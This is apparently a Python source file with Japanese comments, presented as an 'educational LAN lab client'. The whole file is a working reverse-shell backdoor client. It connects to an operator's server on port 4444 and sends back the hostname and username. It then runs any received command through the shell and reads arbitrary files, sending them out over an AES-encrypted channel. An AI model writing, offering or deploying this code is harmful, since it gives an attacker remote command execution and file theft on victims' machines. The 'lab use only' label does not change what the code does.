#!/usr/bin/env python3
"""
LANラボ用クライアント - 教育目的専用
許可されたラボ環境でのみ使用してください

用途:
- 同一Wi-Fiネットワーク内での実験
- VirtualBox環境
"""

import socket
import subprocess
import os
import platform
import json
import base64
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

class LANClient:
    def __init__(self, host, port=4444):
        self.host = host
        self.port = port
        self.key = None
        
    def encrypt(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data.encode(), AES.block_size))
        iv = base64.b64encode(cipher.iv).decode('utf-8')
        ct = base64.b64encode(ct_bytes).decode('utf-8')
        return json.dumps({'iv': iv, 'ciphertext': ct})
    
    def decrypt(self, json_input):
        try:
            b64 = json.loads(json_input)
            iv = base64.b64decode(b64['iv'])
            ct = base64.b64decode(b64['ciphertext'])
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            pt = unpad(cipher.decrypt(ct), AES.block_size)
            return pt.decode('utf-8')
        except Exception as e:
            return None
    
    def get_system_info(self):
        try:
            info = {
                'hostname': platform.node(),
                'system': platform.system(),
                'release': platform.release(),
                'machine': platform.machine(),
                'username': os.getenv('USER') or os.getenv('USERNAME'),
                'cwd': os.getcwd(),
                'python': platform.python_version()
            }
            return json.dumps(info, indent=2)
        except Exception as e:
            return f"エラー: {e}"
    
    def execute_command(self, command):
        try:
            if command.startswith('cd '):
                path = command[3:].strip()
                os.chdir(path)
                return f"ディレクトリを変更しました: {os.getcwd()}"
            
            elif command == 'sysinfo':
                return self.get_system_info()
            
            elif command.startswith('download|'):
                return self.handle_download(command)
            
            else:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                output = result.stdout + result.stderr
                return output if output else "実行が完了しました"
        except subprocess.TimeoutExpired:
            return "タイムアウトしました"
        except Exception as e:
            return f"エラー: {str(e)}"
    
    def handle_download(self, command):
        try:
            _, file_path = command.split('|', 1)
            
            if not os.path.exists(file_path):
                return "ファイルが見つかりません"
            
            with open(file_path, 'rb') as f:
                file_data = base64.b64encode(f.read()).decode()
            
            return file_data
        except Exception as e:
            return f"エラー: {e}"
    
    def connect(self):
        retry_count = 0
        max_retries = 5
        
        while retry_count < max_retries:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.settimeout(10)
                
                print(f"接続を試行しています ({retry_count + 1}/{max_retries}): {self.host}:{self.port}")
                client.connect((self.host, self.port))
                print(f"接続に成功しました")
                
                self.key = base64.b64decode(client.recv(1024))
                
                system_info = self.get_system_info()
                client.send(system_info.encode())
                
                retry_count = 0
                
                while True:
                    try:
                        encrypted_command = client.recv(4096).decode()
                        if not encrypted_command:
                            print("サーバーから切断されました")
                            break
                        
                        command = self.decrypt(encrypted_command)
                        if not command:
                            continue
                        
                        result = self.execute_command(command)
                        
                        if command.startswith('download|'):
                            encrypted_result = self.encrypt(result)
                            client.send(encrypted_result.encode() + b"<FILE_END>")
                        else:
                            encrypted_result = self.encrypt(result)
                            client.send(encrypted_result.encode())
                    except socket.timeout:
                        continue
                    except Exception as e:
                        print(f"エラーが発生しました: {e}")
                        break
                
                client.close()
                break
            except ConnectionRefusedError:
                retry_count += 1
                if retry_count < max_retries:
                    print(f"接続が拒否されました。5秒後に再試行します...")
                    time.sleep(5)
                else:
                    print("最大再試行回数に達しました")
                    return
            except Exception as e:
                retry_count += 1
                print(f"エラーが発生しました: {e}")
                if retry_count < max_retries:
                    time.sleep(5)
                else:
                    return
        
        print("クライアントを終了します")

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("""
同一LAN実験用クライアント

使用方法:
  python3 client.py <サーバーIP> [ポート]
  
例:
  python3 client.py 192.168.1.10
  python3 client.py 192.168.56.101 4444
        """)
        sys.exit(1)
    
    server_host = sys.argv[1]
    server_port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    
    print(f"""
+----------------------------------------------------------+
|     同一LAN実験用クライアント                             |
+----------------------------------------------------------+

接続情報:
  サーバー: {server_host}:{server_port}
    """)
    
    client = LANClient(server_host, server_port)
    client.connect()
